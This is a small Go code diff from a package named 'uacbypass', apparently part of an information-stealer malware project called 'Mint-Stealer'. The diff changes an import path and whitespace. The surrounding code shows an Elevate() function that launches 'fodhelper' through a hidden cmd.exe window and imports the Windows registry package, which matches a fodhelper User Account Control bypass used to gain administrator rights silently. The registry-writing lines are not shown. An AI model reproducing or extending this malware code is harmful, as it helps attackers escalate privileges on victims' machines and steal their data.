@@ -1,11 +1,12 @@
 package uacbypass
 
 import (
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/program"
 	"os"
 	"os/exec"
 	"syscall"
 	"unsafe"
+
+	"github.com/0xFl4q/Mint-Stealer/utils/program"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -61,7 +62,7 @@ func Elevate() error {
 
 	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	
+
 	err = cmd.Run()
 	return err
 }
